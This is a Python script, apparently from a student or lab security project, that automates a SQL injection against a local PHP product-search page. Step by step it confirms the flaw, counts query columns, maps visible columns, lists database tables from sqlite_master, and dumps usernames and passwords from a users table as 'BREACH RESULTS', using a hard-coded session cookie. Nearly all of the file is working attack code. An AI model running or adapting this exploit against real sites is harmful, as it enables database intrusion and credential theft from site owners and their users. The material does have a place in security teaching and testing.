import requests
from bs4 import BeautifulSoup
import time
import re

# --- Configuration ---
BASE_URL = "http://localhost/CyberProject" 
#CHEAT - how do we now that we need to use prudacts page?
#אבל תכלס אפשר לגלות את זה מחיפוש באתר בתור משתמש, ממחקר מקדים שמבצע התוקף
PRODUCTS_URL = f"{BASE_URL}/products.php"
COOKIES = {'PHPSESSID': 'rv82jh01b0c0pq4ift362fg6vp'} #here we can use the SSID script

def print_step(title, payload, explanation):
    print(f"\n\033[1;34m[STEP]: {title}\033[0m")
    print(f"\033[1;32m[PAYLOAD]:\033[0m {payload}")
    print(f"\033[1;33m[EXPLANATION]:\033[0m {explanation}")
    print("-" * 60)
    time.sleep(0.5)

def check_for_error(html):
    return "SQL Error" in html or "Fatal error" in html or "exception" in html.lower()

# ==========================================
# Script Start
# ==========================================


#----------------------------------------------------------------------------------------------
# --- Step 1: cheack if SQLi exitse ---
print_step("Sanity Check", "%'", "Sending a single quote to break the query syntax.")
res = requests.get(PRODUCTS_URL, params={'q': "%'"}, cookies=COOKIES)

if check_for_error(res.text):
    print("[!] Success! The server returned an SQL error.")
else:
    print("[-] No error returned. Check if the Session ID is valid and the site is running.")
    exit()


#----------------------------------------------------------------------------------------------
# --- Step 2: determine how much columns there are in the original query (SELECT) ---
detected_cols = 0
print_step("Enumeration - Column Count", "%' ORDER BY X --", "Incrementing ORDER BY until the page breaks.")

for i in range(1, 10):
    payload = f"%' ORDER BY {i} --"
    res = requests.get(PRODUCTS_URL, params={'q': payload}, cookies=COOKIES)
    
    if check_for_error(res.text):
        detected_cols = i - 1
        print(f"[!] Error at ORDER BY {i}. Conclusion: The table has {detected_cols} columns.")
        break
    else:
        print(f"[*] Column {i} exists...")

if detected_cols == 0:
    print("[-] Failed to detect column count. Defaulting to 5.")
    detected_cols = 5


#----------------------------------------------------------------------------------------------
# --- Step 3: find wich columns we see in the browser (meanning, in the HTML) ---
visible_indices = []
print_step("Mapping Visible Columns", "UNION SELECT markers...", "Injecting markers and searching ONLY in visible text.")

markers = [f"COL_{i+1}" for i in range(detected_cols)]
markers_str = ", ".join([f"'{m}'" for m in markers])
payload_map = f"ZZZ%' UNION SELECT {markers_str} --"

res = requests.get(PRODUCTS_URL, params={'q': payload_map}, cookies=COOKIES)
soup = BeautifulSoup(res.text, 'html.parser')

page_text = soup.get_text() 

for i, marker in enumerate(markers):
    if marker in page_text:
        visible_indices.append(i)
        print(f"[+] Column {i+1} is VISIBLE on the page.")

if not visible_indices:
    visible_indices = [1, 2] 
    print("[-] No visible columns detected in text. Using defaults.")

#----------------------------------------------------------------------------------------------
# --- Step 4: find table's names ---
union_cols = ["NULL"] * detected_cols
union_cols[0] = "rowid" 
name_slot = visible_indices[0] if len(visible_indices) > 0 else 1
union_cols[name_slot] = "printf('!!!%s!!!', name)"

columns_str = ", ".join(union_cols)
payload_tables = f"ZZZ%' UNION SELECT {columns_str} FROM sqlite_master WHERE type='table' --"

print_step("Extracting Table Names", payload_tables, "Isolating names with printf.")
res = requests.get(PRODUCTS_URL, params={'q': payload_tables}, cookies=COOKIES)

tables = re.findall(r'!!!(.*?)!!!', res.text)
tables = list(set([t for t in tables if t != "%s"]))

print(f"\033[1;36m[+] Tables found in DB: {', '.join(tables)}\033[0m")

#----------------------------------------------------------------------------------------------
# --- Step 5: Dump Users and Passwords (גרסת ה-Article עם תיקון ה-ID) ---
if 'users' in tables:
    target_cols = ["NULL"] * detected_cols
    target_cols[0] = "id" 
    
    # מיפוי אוטומטי:
    # השם ילך לעמודה הגלויה הראשונה, הסיסמה לשנייה (אם קיימת)
    name_slot = visible_indices[0] if len(visible_indices) > 0 else 1
    pass_slot = visible_indices[1] if len(visible_indices) > 1 else name_slot
    
    target_cols[name_slot] = "username"
    target_cols[pass_slot] = "password"

    target_str = ", ".join(target_cols)
    payload_users = f"ZZZ%' UNION SELECT {target_str} FROM users --"
    
    print_step("Data Dump", payload_users, "Testing if 'article' search works with unique IDs.")
    res = requests.get(PRODUCTS_URL, params={'q': payload_users}, cookies=COOKIES)
    soup = BeautifulSoup(res.text, 'html.parser')
    
    # חזרה לשיטה המקורית: חיפוש קודם כל את ה"קופסאות"
    cards = soup.find_all('article', class_='product-card')
    
    print("\n\033[1;41;37m[!!!] BREACH RESULTS:\033[0m")
    
    for card in cards:
        # חיפוש פנימי בתוך כל קופסה
        name_div = card.find('div', class_='product-name')
        price_div = card.find('div', class_='product-price')
        
        if name_div and price_div:
            u = name_div.get_text(strip=True)
            p = price_div.get_text(strip=True).replace('₪', '').strip()
            
            if u and u != "NULL":
                print(f"[*] User: {u:<15} | Password: {p}")

else:
    print("[-] 'users' table not found.")

print("\n--- Script Finished ---")